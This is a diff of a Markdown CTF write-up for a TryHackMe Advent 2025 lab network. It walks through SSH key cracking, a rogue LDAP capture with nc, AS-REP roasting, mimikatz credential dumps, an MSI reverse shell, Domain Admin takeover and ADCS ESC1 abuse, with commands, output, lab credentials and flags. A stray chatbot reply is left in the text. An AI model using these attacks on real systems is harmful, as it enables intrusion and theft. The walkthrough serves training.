@@ -1,17 +1,13 @@
-# Hoppers-Origin-Writeup
-
-
-
+# Advent 2025\SideQuest\Sidequest\Sidequest0\Tutorial\Hoppers-Origin-id-root\Hoppers-Origin-Writeup-main [N/A]
 
 Network Layout:
 
 ![](layout.png)
 
-
 WEB -> DMZ -> DB -> AI.VANCHAT.LOC -> SERVER1 -> SERVER2
 VANCHAT.LOC -> SERVER3 -> SERVER4 -> TBFC.LOC
 
-# Network Recon
+## Reconocimiento de Red / Network Recon
 
 ```bash
 ❯ nmap -Pn -n --open \
@@ -37,7 +33,6 @@ PORT   STATE SERVICE
 Nmap done: 255 IP addresses (255 hosts up) scanned in 410.34 seconds
 
 ```
-
 
 As we can see on `10.200.171.10` is hosting a webapp at port 80...
 
@@ -138,7 +133,6 @@ THM{583d5e19-4e61-47f1-b98e-5ece3b2d41db}
 
 Got the root flag....
 
-
 ok now lets try to find if there is any ssh key as our earlier recon shows that there is a ssh service on `10.200.171.11`
 
 ```bash
@@ -170,7 +164,6 @@ FLHQ6nBC63Zb8VP9GxtfiSewAd+OkRPe8B/3c=
 cat id_ed25519.pub
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGT9FlPyzrv+aUraDIDA8Q5nTOhHZ0IpHfpbQDIs/ph/ root@socbot3000
 
-
 ```
 
 we found a ssh key in root dir. And user socbot3000 can access the ssh.. 
@@ -192,7 +185,6 @@ It require a passphrase to do ssh so lets try to get the password
 > --- 
 > _I used my custom Python script instead of John because my system had issues with John._  
 > _If you encounter similar problems, use the Python script below._
-
 
 ```python
 import sys
@@ -365,7 +357,6 @@ You can save it as, e.g., ./malhare_ed25519 and run:
     chmod 600 ./malhare_ed25519
     ssh -i ./malhare_ed25519 scaramouche@10.200.171.11
 
-
 As a final reward, your flag for making it this far: THM{114136cc-e9ab-4303-a825-18cb24d60d90}
 Farewell, burrower. The warren awaits…
 
@@ -385,7 +376,6 @@ Now we have created a new user named `scaramouche` and we have a new ssh key and
 
 Now save the new ssh key into a file ..
 
-
 ```bash 
 ❯ chmod 600 db_rsa 
   03:11:32   vector@AGI  VPN 10.249.1.2   
@@ -404,7 +394,6 @@ Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-1017-aws x86_64)
   Memory usage: 10%                Users logged in:       0
   Swap usage:   0%                 IPv4 address for ens5: 10.200.171.11
 
-
 Expanded Security Maintenance for Applications is not enabled.
 
 245 updates can be applied immediately.
@@ -414,12 +403,9 @@ To see these additional updates run: apt list --upgradable
 Enable ESM Apps to receive additional future security updates.
 See https://ubuntu.com/esm or run: sudo pro status
 
-
 The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
-
 
 The programs included with the Ubuntu system are free software;
 the exact distribution terms for each program are described in the
@@ -450,29 +436,29 @@ echo "  Internal Network Discovery from DB (v2)"
 echo "=========================================="
 echo ""
 
-# Check current network configuration
+Check current network configuration
 echo "[*] Current Network Configuration:"
 ip addr show | grep inet | grep global
 echo ""
 
-# Check DNS/hosts configuration
+## Check DNS/hosts configuration
 echo "[*] DNS/Hosts Configuration:"
 grep "nameserver" /etc/resolv.conf 2>/dev/null
 echo ""
 
-# --- PING SWEEP (Discovery Phase 1) ---
+--- PING SWEEP (Discovery Phase 1) ---
 echo "[*] Performing ping sweep on 10.200.171.0/24..."
-# We keep this for fast discovery of 'friendly' hosts
+We keep this for fast discovery of 'friendly' hosts
 for i in {1..254}; do
     (ping -c 1 -W 1 10.200.171.$i 2>/dev/null | grep "bytes from" | cut -d' ' -f4 | cut -d':' -f1 &)
 done | sort -u -t . -k 4 -n
 echo ""
 
-# --- PORT SCAN (Discovery Phase 2 - The Fix) ---
+--- PORT SCAN (Discovery Phase 2 - The Fix) ---
 echo "[*] TCP Port Scanning ALL hosts (checking ports even if ping fails)..."
 echo "    (Targeting common ports: 22, 80, 445, 3389, 88, 389, 5985)"
 
-# We iterate through the whole subnet range blindly
+We iterate through the whole subnet range blindly
 for i in {1..254}; do
     host="10.200.171.$i"
     
@@ -499,18 +485,18 @@ done
 wait
 echo ""
 
-# Check ARP cache (catches hosts that talked back but blocked ports)
+Check ARP cache (catches hosts that talked back but blocked ports)
 echo "[*] ARP Cache (recently communicated hosts):"
 ip neigh show
 echo ""
 
-# Check for domain information
+Check for domain information
 echo "[*] Checking for Active Directory / Domain information:"
 realm list 2>/dev/null
 cat /etc/krb5.conf 2>/dev/null
 echo ""
 
-# Look for .loc domains (vanchat.loc, tbfc.loc)
+Look for .loc domains (vanchat.loc, tbfc.loc)
 echo "[*] Testing for domain names mentioned in scope:"
 for domain in "vanchat.loc" "ai.vanchat.loc" "tbfc.loc" "db.vanchat.loc"; do
     host $domain 2>/dev/null && echo "    [+] $domain resolved!"
@@ -520,7 +506,6 @@ echo ""
 echo "=========================================="
 echo "  Scan Complete!"
 echo "=========================================="
-
 
 ```
 
@@ -632,7 +617,6 @@ Host db.vanchat.loc not found: 3(NXDOMAIN)
 ==========================================
 
 ```
-
 
 As we can see there is a service at port `80` it must be a webapp so lets try to get the html of that page.
 ```html
@@ -780,7 +764,6 @@ $("go").addEventListener("click", async ()=>{
 </html>
 ```
 
-
 so now we know the API endpoint and the form parameters we can send a POST request to the server with a payload and change the server value to the database machine.
 
 So now let try **Rogue LDAP Server Attack**
@@ -790,7 +773,7 @@ So we open another ssh on separate terminal  and set up a listner:
 Now send a post request to the server
 
 ```bash
-# On the database machine (10.200.171.11)
+On the database machine (10.200.171.11)
 curl -X POST http://10.200.171.101/api/test \
      -H "Content-Type: application/json" \
      -d '{"username":"anne.clark@ai.vanchat.loc", "password":"anything", "server":"10.200.171.11", "port":4444}'
@@ -800,11 +783,11 @@ curl -X POST http://10.200.171.101/api/test \
 Since LDAP is unencrypted by default, the password of the user also appeared in the terminal next to the username.
 
 ```bash
-# on another ssh session.
+on another ssh session.
 scaramouche@db:~$ nc -lvnp 4444
 Listening on 0.0.0.0 4444
 Connection received on 10.200.171.101 49834
-0�1`�(anne.clark@ai.vanchat.locWbqs81930�B
+01`(anne.clark@ai.vanchat.locWbqs81930B
 ```
 
 So the credentials are:
@@ -824,7 +807,7 @@ But there is a problem as there is no tools on db machine so we have to do ssh t
 debug1: Remote: /home/scaramouche/.ssh/authorized_keys:1: key options: agent-forwarding port-forwarding pty user-rc x11-forwarding
 debug1: Remote: /home/scaramouche/.ssh/authorized_keys:1: key options: agent-forwarding port-forwarding pty user-rc x11-forwarding
 
-# So we successfully created ssh  tunnel.
+So we successfully created ssh  tunnel.
 ```
 
 Now lets try to Query LDAP to find users with "Do not require Kerberos preauthentication" enabled.
@@ -849,7 +832,6 @@ Tools like `GetNPUsers` need to resolve the domain name `ai.vanchat.loc`
 ```bash
 echo "127.0.0.1 ai.vanchat.loc" | sudo tee -a /etc/hosts
 ```
-
 
 ```bash
 python3 /usr/bin/GetNPUsers.py -request -format john -dc-ip 127.0.0.1 ai.vanchat.loc/anne.clark:Wbqs8193 -usersfile clean_users.txt -outputfile asrep_hashes.txt
@@ -887,7 +869,6 @@ Lets expand out ssh tunnel...
 
 Then in another terminal open a evil-winrm session or you can also use rdp..
 
-
 ```bash
 ❯ sudo evil-winrm -i 127.0.0.1 -u 'qw2.amy.young' -p 'password1!'
                                         
@@ -904,9 +885,7 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users> cd ..
 *Evil-WinRM* PS C:\> ls
 
-
     Directory: C:\
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -918,7 +897,6 @@ d-----        12/2/2025  10:18 AM                Program Files (x86)
 d-r---        11/2/2025   6:05 PM                Users
 d-----        11/2/2025   4:36 PM                Windows
 -a----        11/2/2025   6:19 PM             41 user.txt
-
 
 *Evil-WinRM* PS C:\> type user.txt
 THM{20f7d7ac-5768-4883-a33f-09e4a738bff1}
@@ -964,7 +942,6 @@ then on db server setup a listner to capture the root shell
 > ---
 > _Make sure you run this payload in rdp session cause msi payloads execution using evil-winrm often fails_
 
-
 ![](data2.png)
 
 now on your db you will receive the root shell
@@ -976,18 +953,16 @@ Connection received on 10.200.171.101 50091
 Microsoft Windows [Version 10.0.17763.3287]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
-
 C:\Windows\system32>type  C:\Users\Administrator\root.txt
 type  C:\Users\Administrator\root.txt
 THM{d93ffd47-5629-4590-8eb3-743404547e04}
 
-Hopper got giddy remembering where the siege on Wareville first began: VanChat. The rush of excitement he felt when LLMs were introduced to the world gave him another attack surface to penetrate�another perimeter to breach�
+Hopper got giddy remembering where the siege on Wareville first began: VanChat. The rush of excitement he felt when LLMs were introduced to the world gave him another attack surface to penetrateanother perimeter to breach
 C:\Windows\system32>
 
 ```
 
 **Root flag found**: `THM{d93ffd47-5629-4590-8eb3-743404547e04}`
-
 
 now lets add `amy` to admin group ( For backup )
 
@@ -1023,7 +998,6 @@ Flags      : 00004004
 Credential : _4v41yVd$!DW
 Attributes : 0
 
-
 mimikatz(commandline) # vault::list
 
 Vault : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
@@ -1047,7 +1021,6 @@ Vault : {77bc582b-f0a6-4e15-4e80-61736b6f3b29}
 
 		*** Domain Password ***
 
-
 mimikatz(commandline) # exit
 Bye!
 
@@ -1056,7 +1029,6 @@ Bye!
 So we got the credentials for brian which are...
 	Username: qw1.brian.singh
 	Password: _4v41yVd$!DW  
-
 
 ## 4-Server 2
 
@@ -1067,9 +1039,7 @@ sudo evil-winrm -i 127.0.0.1 -u 'qw1.brian.singh' -p '_4v41yVd$!DW'
 *Evil-WinRM* PS C:\Users> cd ..
 *Evil-WinRM* PS C:\> ls
 
-
     Directory: C:\
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -1080,7 +1050,6 @@ d-----        12/2/2025  10:18 AM                Program Files (x86)
 d-r---        11/2/2025   4:09 PM                Users
 d-----       10/29/2025   6:53 AM                Windows
 -a----        11/2/2025   8:17 PM             41 user.txt
-
 
 *Evil-WinRM* PS C:\> type user.txt
 THM{d626aea9-d1ab-4f77-b668-90f221e3dbb6}
@@ -1145,7 +1114,6 @@ proxychains python3 bloodyAD.py \
 --host 10.200.171.122 \
 add groupMember "Domain Admins" "qw1.brian.singh"
 
-
 ```
 
 Now Brian is the domain admin.
@@ -1162,17 +1130,14 @@ Hopper got giddy remembering where the siege on Wareville first began: VanChat. 
 
 **Root flag found: ** `THM{d93ffd47-5629-4590-8eb3-743404547e04}`
 
-
 ## 5-AI.VANCHAT.LOC 
 
 So Brian is now Domain Admin, We can use his credentials to execute code on the Domain Controller - 10.200.171.122
-
 
 We cannot pass a plain text password to Invoke-Command for security 
 reasons!
 
 We have to convert it into an Encrypted Secure String first, then wrap that into a PSCredential object!
-
 
 **Convert plain text password to encrypted string**
 	`$pass = ConvertTo-SecureString '_4v41yVd$!DW' -AsPlainText -Force`
@@ -1199,11 +1164,9 @@ What was it then? Oh, that’s right. Hopper really put the AD in MAD. Active Di
 **User flag found:** `THM{1dac8c6b-908e-4100-9deb-f53e68df840d}`
 **Root flag found:** `THM{c4baffdf-7a8d-44e0-8405-3cb6a2bb91cc}`
 
-
 ## 6-VANCHAT.LOC
 
 lets list the domain trusts `nltest /domain_trusts`
-
 
 ```powershell
 *Evil-WinRM* PS C:\Users\qw1.brian.singh\Documents> nltest /domain_trusts
@@ -1229,7 +1192,6 @@ This creates a "tunnel" to the DC's C: drive and calls it Z then copy the tools
 Name           Used (GB)     Free (GB) Provider      Root                                                                                                                                                                                 CurrentLocation
 ----           ---------     --------- --------      ----                                                                                                                                                                                 ---------------
 Z                                      FileSystem    \\DC1.ai.vanchat.loc\C$
-
 
 *Evil-WinRM* PS C:\Users\qw1.brian.singh> Copy-Item -Path ".\mimikatz.exe" -Destination "Z:\Windows\Temp\mimikatz.exe"
 
@@ -1322,10 +1284,8 @@ Supplemental Credentials:
     28  82053084497dbda448d48ae64a490f5f
     29  889a782ee264038273dead10a2c68f62
 
-
 mimikatz(commandline) # exit
 Bye!
-
 
 ```
 
@@ -1424,7 +1384,6 @@ Bye!
 THM{e36efac9-555b-424a-b44d-8bfd9bc5f660}
 *Evil-WinRM* PS C:\Users\qw1.brian.singh> 
 ```
-
 
 Extract the `root.txt`
 
@@ -1540,9 +1499,7 @@ Invoke-Command -ComputerName DC1.ai.vanchat.loc -Credential $cred -ScriptBlock {
 }
 ```
 
-
 ## Server 3 
-
 
 ###### Enumeration
 
@@ -1609,8 +1566,6 @@ Bye!
 
 ```
 
-
-
 ```bash
 #RDP as Brian on Server 2
 xfreerdp3 /v:127.0.0.1:3390 /u:'qw1.brian.singh' /p:'_4v41yVd$!DW' /cert:ignore +clipboard /dynamic-resolution
@@ -1628,10 +1583,8 @@ PS C:\Users\qw1.brian.singh> mstsc /v:10.200.171.122
 ![](data4.png)
 	Press Yes...
 
-
 Then we have to `RDP as AGI (The user we created earlier) from DC1 to RDC1`
 ![](data5.png)
-
 
 The earlier recon showed that there are other users also...
 
@@ -1662,7 +1615,6 @@ PS C:\>
 
 **User flag found:** `THM{a89e2667-f920-4c10-99ec-3ed33a7cf1b9}`
 **Root flag found:** `THM{4fc264ab-8449-4039-a22d-25ee7d15626e}`
-
 
 ```powershell
 PS C:\> sqlcmd -S . -E -Q "EXEC('xp_cmdshell ''nltest /dclist:tbfc.loc''') AT [TBFC_LS]"
@@ -1699,16 +1651,13 @@ PS C:\>
 PS C:\> cd Users
 PS C:\Users> dir .\qw1.owen.khan\Documents\
 
-
     Directory: C:\Users\qw1.owen.khan\Documents
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 d-----       10/30/2025  10:31 PM                SQL Server Management Studio
 d-----       10/30/2025  10:32 PM                SQL Server Management Studio 21
 d-----         9/7/2022   3:57 PM                WindowsPowerShell
-
 
 PS C:\Users>
 ```
@@ -1726,11 +1675,9 @@ Running  SQLSERVERAGENT     SQL Server Agent (MSSQLSERVER)
 Running  SQLTELEMETRY       SQL Server CEIP service (MSSQLSERVER)
 Running  SQLWriter          SQL Server VSS Writer
 
-
 ```
 
 This confirms the server's Role. Since it is running, we can interact with the database engine locally using our current Windows token.
-
 
 Now lets use.NET SQL client to grab the data and force it into a readable table
 
@@ -1763,13 +1710,10 @@ name                                                                            
 TBFC_LS                                                                                                                                           1
 ```
 
-
 Bridge between vanchat.loc and tbfc.loc is configured 
 to allow Remote Procedure Calls (RPC)!
 
 Lets see the user:
-
-
 
 ```powershell
 PS C:\Users> sqlcmd -S . -E -Q "EXEC('xp_cmdshell ''whoami''') AT [TBFC_LS]"
@@ -1813,12 +1757,10 @@ output
 
 The command completed successfully.  
 
-
  sqlcmd -S . -E -Q "EXEC('xp_cmdshell ''net localgroup Administrators AGI /add''') AT [TBFC_LS]"
 output                                                                                                                                                                                                                                          
 
 The command completed successfully.
-
 
 sqlcmd -S . -E -Q "EXEC('xp_cmdshell ''netstat -an | findstr :3389''') AT [TBFC_LS]"
 output                                                                                                                                                                                                                                          
@@ -1846,11 +1788,9 @@ Drag to Copy the mimikatz.exe to Local Disk (C:)
 
 **Remember to Disable Virus & Threat Protection!
 
-
 ##### Active Directory Certificate Authorities Reconnaissance
 
 ```powershell
-
 
 sqlcmd -S . -E -Q "EXEC('xp_cmdshell ''certutil -ADCA''') AT [TBFC_LS]"**
 Purpose: Enumerate all Certificate Authorities in the Active Directory environment
@@ -1921,7 +1861,6 @@ Several certificates are expired (expected for old trust chains)
 
 `sqlcmd -S . -E -Q "EXEC('xp_cmdshell ''certutil -store My''') AT [TBFC_LS]"`
 
-
 Purpose: View certificates enrolled on the TBFC-SQLServer1 machine
 Key Findings:
 
@@ -1936,7 +1875,6 @@ Purpose: Computer authentication
 Encryption test: Passed
 
 This confirms the linked server has a valid machine certificate for authentication
-
 
 ##### Administrator Template
 
@@ -1989,7 +1927,6 @@ Minimum key size: 2048 bits
 
 Vulnerability Assessment: NOT VULNERABLE - Properly secured, only admins can 
 enroll.
-
 
 ##### TBFCWebServer Template
 
@@ -2062,7 +1999,6 @@ Export/use certificate for authentication
 Authenticate as Domain Administrator
 Full domain compromise!!!
 
-
 Understood. Below is your original write-up with **no headings added**, **no content changed**, and **no commands modified**.  
 I have only **separated explanations from actions**, clearly and minimally.
 
@@ -2126,7 +2062,6 @@ Drag to Copy the PsExec.exe to Local Disk (C:)
 
 ---
 
-
 `PsExec.exe` is executed with SYSTEM privileges to spawn an interactive SYSTEM PowerShell session, which is required for certificate abuse.
 
 Get a PowerShell as System:  
@@ -2139,7 +2074,6 @@ Open Powershell as Administrator then run:
 ---
 
 With SYSTEM-level access, the Certificate Signing Request can now be submitted to the Certificate Authority to complete ESC1 exploitation.
-
 
 ##### Certificate Creation and Export to Authenticate
 
@@ -2176,7 +2110,6 @@ Active Directory Enrollment Policy
 CertReq: Request Created 
 ```
 
-
 Submit the CSR to the CA
 
 ```powershell
@@ -2199,7 +2132,6 @@ Installed Certificate:
   Thumbprint: 13130c25703d1ce0c0be731a53a1769002295015
   
 ```
-
 
 Export the Certificate and Key for administrator@tbfc.loc into a PFX file:
 
@@ -2230,7 +2162,6 @@ Signature test passed (CNG)
 ----------------  End force NCrypt  ----------------
 CertUtil: -exportPFX command completed successfully.
 ```
-
 
 Request and Inject Admin TGT (Ticket Granting Ticket)
 
@@ -2294,9 +2225,7 @@ Request and Inject Admin TGT (Ticket Granting Ticket)
   Base64(key)           :  EaTA9tNcnxaOua2QXgOsWg==
 ```
 
-
 Now extract the flags
-
 
 ```bash
 #User.txt
